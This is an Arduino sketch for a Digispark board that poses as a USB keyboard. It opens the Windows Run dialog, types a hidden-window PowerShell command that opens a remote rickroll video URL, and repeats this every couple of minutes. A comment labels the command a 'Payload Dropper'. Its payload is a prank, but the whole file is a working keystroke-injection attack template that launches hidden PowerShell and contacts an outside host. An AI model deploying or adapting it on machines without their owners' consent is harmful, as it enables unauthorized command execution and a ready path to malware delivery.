#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}
void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -windowstyle hidden -command \"$url = 'https://shattereddisk.github.io/rickroll/rickroll.mp4'; Start-Process $url\"; //Payload Dropper");

  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}
